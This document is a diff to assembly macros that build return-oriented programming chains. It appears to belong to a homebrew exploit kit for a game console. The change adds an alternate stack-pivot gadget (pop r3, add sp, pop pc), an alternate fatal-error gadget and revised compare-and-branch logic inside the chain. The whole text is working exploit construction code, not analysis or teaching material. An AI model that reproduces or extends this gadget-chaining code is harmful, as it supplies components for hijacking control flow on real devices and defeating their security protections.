@@ -253,6 +253,7 @@ CALLFUNC_LDRR1 GXLOW_CMD4, \srcadr, \dstadr, \cpysize, 0, 0, 0, 0, 0x8
 CALLFUNC_LDRR0R1 GXLOW_CMD4, \srcadr, \dstadr, \cpysize, 0, 0, 0, 0, 0x8
 .endm
 
+#ifndef ROP_POPR3_ADDSPR3_POPPC
 .macro ROPMACRO_STACKPIVOT_PREPARE sp, pc
 @ Write to the word which will be popped into sp.
 ROPMACRO_WRITEWORD (ROPBUF + (stackpivot_sploadword - _start)), \sp
@@ -260,21 +261,41 @@ ROPMACRO_WRITEWORD (ROPBUF + (stackpivot_sploadword - _start)), \sp
 @ Write to the word which will be popped into pc.
 ROPMACRO_WRITEWORD (ROPBUF + (stackpivot_pcloadword - _start)), \pc
 .endm
+#endif
+
+#ifdef ROP_POPR3_ADDSPR3_POPPC
+.macro ROPMACRO_STACKPIVOT_JUMP
+.word ROP_POPR3_ADDSPR3_POPPC
+.endm
+#endif
 
 .macro ROPMACRO_STACKPIVOT sp, pc
-ROPMACRO_STACKPIVOT_PREPARE \sp, \pc
+#ifndef ROP_POPR3_ADDSPR3_POPPC
+	ROPMACRO_STACKPIVOT_PREPARE \sp, \pc
 
-ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
+	ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
 
-ROPMACRO_STACKPIVOT_JUMP
+	ROPMACRO_STACKPIVOT_JUMP
+#else
+	.word ROP_POPR3_ADDSPR3_POPPC
+	.word \sp - (ROPBUF + ((. + 0x4) - _start))
+#endif
 .endm
 
 .macro COND_THROWFATALERR
-.word ROP_COND_THROWFATALERR
+#ifdef ROP_COND_THROWFATALERR
+	.word ROP_COND_THROWFATALERR
 
-.word 0 @ r3
-.word 0 @ r4
-.word 0 @ r5
+	.word 0 @ r3
+	.word 0 @ r4
+	.word 0 @ r5
+#elif defined (ROP_COND_THROWFATALERR_ALT0)
+	.word ROP_COND_THROWFATALERR_ALT0
+
+	.word 0 @ r3, r0 is also loaded from here.
+#else
+	#error "ROP_COND_THROWFATALERR* isn't defined."
+#endif
 .endm
 
 #define ROPMACRO_CMPDATA_CMPADDR_OFFSET 0x2C
@@ -288,19 +309,30 @@ ROP_SETR1 \cmpword
 
 #ifdef ROP_CMPR0R1
 .word ROP_CMPR0R1
+.word 0
 #elif defined (ROP_CMPR0R1_ALT0)
 .word ROP_CMPR0R1_ALT0
 #else
 #error "ROP_CMPR0R1* isn't defined."
 #endif
 
+#ifndef ROP_POPR3_ADDSPR3_POPPC
 ROPMACRO_STACKPIVOT_PREPARE \stackaddr_cmpmismatch, ROP_POPPC
 
 ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
+#endif
 
 ROP_SETR0 (ROPBUF + ((ropkit_cmpobject) - _start))
 
+#ifdef ROP_POPR3_ADDSPR3_POPPC
+ROP_SETLR POP_R1PC
+#endif
+
 .word ROP_EQBXLR_NE_CALLVTABLEFUNCPTR @ When the value at cmpaddr matches cmpword, continue the ROP, otherwise call the vtable funcptr which then does the stack-pivot.
+
+#ifdef ROP_POPR3_ADDSPR3_POPPC
+.word (\stackaddr_cmpmismatch) - (ROPBUF + ((. + 0x4) - _start))
+#endif
 .endm
 
 @ Size: 0x14 + 0x8 + 0x8 + 0x4 (0x28)
